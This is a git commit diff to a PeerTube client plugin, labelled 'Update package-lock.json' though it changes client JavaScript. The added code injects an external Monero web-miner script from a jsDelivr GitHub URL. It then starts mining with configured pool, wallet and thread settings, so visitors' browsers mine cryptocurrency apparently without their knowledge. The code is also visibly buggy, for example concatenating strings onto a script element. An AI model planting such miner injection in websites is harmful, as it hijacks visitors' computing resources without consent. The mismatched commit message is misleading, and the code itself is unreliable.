dae17c8ec7b3ebfb4627199614c479338d2a1aae
PYU224 <muikamachi8993@protonmail.com>
2025-01-25 08:47:13 +0900

    Update package-lock.json

--- client/common-client-plugin.js
+++ client/common-client-plugin.js
@@ -9,35 +9,33 @@ peertubeHelpers.getSettings().then(
         return
       }
 
+// JavaScriptとは違うのにPromiseは使えるとかこれもうわかんねぇな
+new Promise((resolve) => {
       // 外部スクリプトを挿入
-      if ( !externalScript ) {
       const externalScript = document.createElement("script")
       externalScript.src = "https://cdn.jsdelivr.net/gh/NajmAjmal/monero-webminer@main/script.js"
       externalScript.async = false
       document.head.appendChild(externalScript)
 
-      console.log("Waiting...")
-      return
-      }
-
-      if ( !inlineScript ) {
+      resolve();
+}).then(() => {
       // 外部スクリプトのロード完了後に処理開始
-        console.log("Mining script loaded successfully.")
+      console.log("Mining script loaded successfully.")
 
-        let inlineScript = document.createElement("script")
-        inlineScript+= "server = '"+s['webSocket']+"';\n"
-        inlineScript+= "var pool = '"+s['poolAddress']+"';\n"
-        inlineScript+= "var walletAddress = '"+s['walletAddress']+"';\n"
-        inlineScript+= "var workerId = 'PeerTube-Miner';\n"
-        inlineScript+= "var threads = '"+s['threads']+"';\n"
-        inlineScript+= "var password = '"+s['password']+"';\n"
-        inlineScript+= "startMining(pool, walletAddress, workerId, threads, password);\n"
-        inlineScript+= "throttleMiner = 20;\n"
+      let inlineScript = document.createElement("script")
+      inlineScript+= "server = '"+s['webSocket']+"';\n"
+      inlineScript+= "var pool = '"+s['poolAddress']+"';\n"
+      inlineScript+= "var walletAddress = '"+s['walletAddress']+"';\n"
+      inlineScript+= "var workerId = 'PeerTube-Miner';\n"
+      inlineScript+= "var threads = '"+s['threads']+"';\n"
+      inlineScript+= "var password = '"+s['password']+"';\n"
+      inlineScript+= "startMining(pool, walletAddress, workerId, threads, password);\n"
+      inlineScript+= "throttleMiner = 20;\n"
 
-        document.body.appendChild(inlineScript)
-        console.log("Mining started.")
-      return
-      }
+      document.body.appendChild(inlineScript)
+      console.log("Mining started.")
+});
+
     }
   )
 }
